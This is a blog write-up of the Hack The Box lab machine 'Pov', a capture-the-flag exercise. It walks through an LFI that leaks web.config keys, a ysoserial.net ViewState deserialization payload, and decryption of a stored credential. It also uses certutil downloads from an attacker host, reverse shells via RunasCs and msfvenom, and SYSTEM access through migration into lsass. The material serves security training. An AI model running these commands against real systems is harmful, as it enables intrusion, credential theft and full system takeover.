---
date: 2024-06-07T12:42:21-05:00
# description: ""
image: "/images/HTB-Pov/Pov.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Pov"
type: "post"
---

* Platform: Hack The Box
* Link: [Pov](https://app.hackthebox.com/machines/Pov)
* Level: Medium
* OS: Windows
---

Pov starts with a basic static website. After some enumeration, we discover a subdomain leading to an ASP.NET website that turns out to be vulnerable to LFI. Leveraging this vulnerability, we are able to read a critical file exposing sensitive information that we use to exploit the `ViewState` mechanism of the website, granting us our initial foothold. After exploring the target system, we move laterally to another user after finding and revealing their credentials. Finally, we get the root flag by abusing the `SeDebugPrivilege`.

**A Windows VM with Defender disabled will be needed to reproduce one of the step of the writeup.**

Target IP - `10.10.11.251`

## Scanning

```
nmap -sC -sV -oA nmap/Pov 10.10.11.251
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 14:41 CDT
Nmap scan report for 10.10.11.251
Host is up (0.055s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.01 seconds
```

## Enumeration

To make the enumeration easier we can add the target to our `/etc/hosts` file.

```
sudo echo "10.10.11.251 pov.htb" | sudo tee -a /etc/hosts
```

The scan finds only one open port (80) running `http`. Visiting `http://10.10.11.251/` we find a static website offering some security services but no apparent exploitation paths. 

![Pov website](/images/HTB-Pov/pov-website.png)

With ffuf we are able to identify a subdomain.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H "Host: FUZZ.pov.htb" -ic -fs 12330
```

![Pov subdomain](/images/HTB-Pov/subdomain-pov.png)

`http://dev.pov.htb/` leads to a portfolio website, of a web developer proficient with JS, ASP.NET, and PHP.

![Pov portfolio website](/images/HTB-Pov/portfolio-website.png)

We are able to download the his CV with the button. We can see that the `file` parameter is used and it references `cv.pdf`. We can try to use this for a LFI.

![Pov CV download request](/images/HTB-Pov/cv-download.png)

On Windows the hosts file is located at: `C:\WINDOWS\system32\drivers\etc\hosts`.

![Pov LFI vulnerability](/images/HTB-Pov/LFI-hosts-file.png)

We are actually able to read it! With the help of `Wappalyzer` we learn that the application is built with ASP.NET and some research tells us that `web.config` is the configuration file "used to manage various settings that define a website" in ASP.NET applications. *Read more about it [here](https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/)*.

![Pov wappalyzer info](/images/HTB-Pov/web-framework.png)

![ASP.NET Web config file](/images/HTB-Pov/web-config.png)

We are able to successfully read the configuration file. by replacing the `file` value with `/web.config`.

![Web config file read](/images/HTB-Pov/web-config-file.png)

Researching about `asp.net machine key exploitation` we find [this](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter) HackTricks page explaining how to use a tool call [ysoserial.net](https://github.com/pwntester/ysoserial.net) to exploit `vIewState`. 

Under `Testcase 1.5` we read that we have to provide two parameters `--apppath="/"` and `--path="/hello.aspx"`.

We also need our payload to be base64 encoded, which we get on [revshells](https://www.revshells.com/) using `PowerShell #3 (Base64)` reverse shell. 

## Initial Foothold

This tool (`ysoserial`) is designed for Windows we use a Windows VM with Defender disabled because it flags the tool as malicious. After executing the command below we copy its output and paste it into the `ViewState` parameter.

**Command example**

```
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<INSERT_REVSHELL_HERE>" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![ViewState Payload](/images/HTB-Pov/ViewState-payload.png)

We setup our listener and send the request which should result in us catching a shell.

![Initial Foothold](/images/HTB-Pov/initial-foothold.png)

This account cannot read the user flag but we find a file called `connection.xml` in `C:\Users\sfitz\Documents`. It has the credentials for the user `alaading`.

```shell
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

We can see a password value but it is not hashed, rather it uses a Powershell module leveraging secure XML. *Read more about it [here](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)*.

We can reveal the password with the commands below.

```
$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml

$cred.GetNetworkCredential() | fl
```

![User alaading user](/images/HTB-Pov/alaading-creds.png)

### Lateral Movement

With the credentials we can now use [RunasCs](https://github.com/antonioCoco/RunasCs) to get to get a shell as the user `alaading`.

We send the tool on the target.

```
certutil -urlcache -f http://<IP_address>:<PORT>/RunasCs.exe runascs.exe
```

![runascs download](/images/HTB-Pov/dl-runascs.png)

After running the command below, we get a shell.

```
.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r <IP_address>:<PORT>
```

![alaading shell](/images/HTB-Pov/alaading-shell.png)

The user flag is available at `C:\Users\alaading\desktop\user.txt`.

## Privilege Escalation

We saw that this user has the privilege `SeDebugPrivilege`. From [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege), we read that "This privilege permits the **debug other processes**, including to read and write in the memory. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege."

We start by generating a payload with msfvenom.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
```

We send the executable on the target.

```
certutil -urlcache -f http://<IP_address>:<PORT>/revshell.exe revshell.exe
```

![reverse shell file](/images/HTB-Pov/revshell.png)

Then open Metasploit, run the `mutli/handler`, execute the `revshell.exe` file on the target and you will get a meterpreter session.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <IP_address>
set lport <PORT>
run
```

![meterpreter session](/images/HTB-Pov/meterpreter-session.png)

With the `ps` command we are able to see the processes running on the target and we notice `lsass.exe`. Since we have `SeDebugPrivilege` we can migrate to this process.

> lsass.exe is a Windows process that **takes care of security policy for the OS**.

![lsass process](/images/HTB-Pov/lsass-process.png)

![process migration](/images/HTB-Pov/process-migration.png)

We use `shell` to spawn a `cmd` shell, we are now `nt authority\system` and the root flag is at `C:\Users\Administrator\Desktop\root.txt`.

![Root flag](/images/HTB-Pov/root-flag.png)

A Windows VM is sometimes necessary to run some tools for penetration testing, I highly recommend [CommandoVM](https://github.com/mandiant/commando-vm) as it comes with many tools that are not included in Kali Linux. You can follow [this video](https://www.youtube.com/watch?v=nNMEhm8pvPM&ab_channel=Lsecqt) for an installation tutorial. I hope this write up was useful to you!


